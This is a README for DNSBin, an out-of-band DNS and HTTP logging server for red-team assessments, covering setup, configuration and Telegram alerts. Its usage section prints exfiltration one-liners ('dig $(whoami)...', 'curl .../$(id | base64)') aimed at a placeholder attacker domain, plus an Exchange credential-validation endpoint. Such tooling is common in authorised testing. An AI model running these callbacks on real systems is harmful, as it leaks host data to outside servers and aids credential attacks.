<h1 align="center">
  <br>
  DNSBin - Out-of-Band Interaction Server
  <br>
</h1>

<h4 align="center">Advanced DNS & HTTP logging platform for detecting blind vulnerabilities during security assessments</h4>

## Overview

**DNSBin** is an out-of-band (OOB) interaction server for red team operations. It captures DNS queries and HTTP requests with real-time Telegram notifications - perfect for identifying blind SSRF, XXE, RCE, and data exfiltration.

## Features

- **DNS Server** (Port 53) - Custom DNS responses with A/TXT record support
- **HTTP Logger** - Capture callbacks with geolocation tracking
- **Exchange Validator** - NTLM authentication testing for OWA/Exchange
- **Real-time Alerts** - Instant Telegram notifications with IP geolocation
- **PostgreSQL Logging** - Complete interaction history
- **Docker Ready** - Quick deployment with docker-compose

## Installation

### Docker (Recommended)

```bash
git clone https://github.com/dunghm19/dnsbin.git
cd dnsbin
cp config.example.yaml config.yml
docker-compose up -d
```

## Configuration

Edit `config.yml`:

```yaml
environment: production
db_source: postgresql://user:pass@localhost:5432/dnsbin?sslmode=disable
migration_url: file://db/migration
http_server_address: 0.0.0.0:8080

# Your OOB domain
dns_domain: "oob.yourdomain.com"
http_log:
  - "https://oob.yourdomain.com"

# Telegram notifications
notify:
  - type: telegram
    bot_token: "YOUR_BOT_TOKEN"
    chat_id: "YOUR_CHAT_ID"

# Optional: Exchange validation
endpoint: "https://target.com/autodiscover/autodiscover.xml"
insecure: true
proxy_url: ""  # Optional HTTP/SOCKS proxy
```

**DNS Setup:**
```bash
# NS delegation (recommended)
oob.yourdomain.com.    IN  NS  ns1.yourdomain.com.
ns1.yourdomain.com.    IN  A   YOUR_SERVER_IP

# Or wildcard A record
*.oob.yourdomain.com.  IN  A   YOUR_SERVER_IP
```

##  Usage

### 1. DNS Monitoring

```bash
# Test DNS logging
nslookup test.oob.yourdomain.com
dig payload.oob.yourdomain.com

# Data exfiltration
dig $(whoami).oob.yourdomain.com

# HTTP logging endpoint
curl https://oob.yourdomain.com/httplog/test-payload

# With data
curl https://oob.yourdomain.com/httplog/$(id | base64)

# Validate Exchange/OWA credentials via NTLM
curl "https://oob.yourdomain.com/users/login?username=domain\user&password=Pass123"
```

## Telegram Notifications

**When interaction detected:**
```
🔥 Detected DNS log

📝 Record: test.oob.yourdomain.com
🤖 IP Address: 1.2.3.4
📍 Location: Vietnam - Hanoi
⏰ Time: 2025-10-06 14:30:45

#DNS
```

**Startup notification:**
```
🔥 DNS&HTTP Log initialized successfully

⚙️ Version: v1.1.0

🌐 HTTP log
https://oob.yourdomain.com/httplog/{payload}

🌐 Exchange log  
https://oob.yourdomain.com/users/login?username={user}&password={pass}

🕸 DNS log
{payload}.oob.yourdomain.com
```

## Contributing

Pull requests are welcome! For major changes, please open an issue first.
